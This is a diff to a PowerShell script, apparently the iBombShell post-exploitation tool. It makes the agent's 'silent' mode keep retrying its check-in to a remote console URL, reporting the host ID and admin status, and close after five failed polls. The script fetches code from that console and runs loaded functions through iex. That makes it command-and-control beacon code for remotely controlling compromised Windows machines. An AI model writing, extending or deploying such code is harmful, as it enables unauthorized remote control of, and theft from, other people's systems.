@@ -44,6 +44,7 @@ function console{
 
     if($Silently)
     {
+        
         loader -command "generateid" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
         loader -command "isadmin" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
         if(-not($id))
@@ -58,8 +59,20 @@ function console{
         #i am new warrior
         if($uriConsole.Length -ne 0)
         {
-            $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id/$admin"
-            #iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$admin}
+            # Waiting for a successful connection
+            while ($true)
+            {
+                try 
+                {
+                    $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id/$admin"
+                    #iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$admin}
+                    break
+                }
+                catch 
+                {
+
+                }
+            }
         }
     }
     else{
@@ -99,14 +112,31 @@ function console{
         write-host
     }
 
+    $try_connection = 0
+    
     while($global:condition)
     {
 
         if($Silently)
         {
+            
             if($uriConsole.Length -ne 0)
             {
-                $content = (iwr -UseBasicParsing -Uri "$uriConsole/ibombshell/$id").content 
+                try 
+                {
+                    $content = (iwr -UseBasicParsing -Uri "$uriConsole/ibombshell/$id").content 
+                } 
+                catch 
+                {
+                    $content = ""
+                    $try_connection += 1
+                    if ($try_connection -eq 5) 
+                    {
+                        # If the connection fails 5 attempts the console closes
+                        break
+                    }
+                }
+
                 if($content.length -gt 0)
                 { 
                     try {
